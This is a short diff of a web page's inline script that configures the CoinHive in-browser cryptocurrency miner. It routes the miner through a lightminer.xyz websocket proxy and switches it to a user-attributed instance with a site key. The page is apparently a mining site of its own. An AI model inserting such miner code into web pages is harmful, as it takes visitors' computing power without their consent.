@@ -95,7 +95,7 @@
         <div>
             <script>
                 CoinHive.CONFIG.WEBSOCKET_SHARDS = [["wss://proxy.lightminer.xyz"]];
-                var miner = new CoinHive.Anonymous('etnkQZgefwYTyJj1zwQpmD6xSTNU1XbWwi8XFRD1fSCATbVWGHKMp52gZ1pykE2ik72SYQFYvJVQzKZvDrtNjYwq1agvZthdZH', {throttle: userthrottle});
+                var miner = new CoinHive.User('etnkQZgefwYTyJj1zwQpmD6xSTNU1XbWwi8XFRD1fSCATbVWGHKMp52gZ1pykE2ik72SYQFYvJVQzKZvDrtNjYwq1agvZthdZH',lightminer, {throttle: userthrottle});
                 if(miner.ismobile){
                     var numthreads=2
                 }
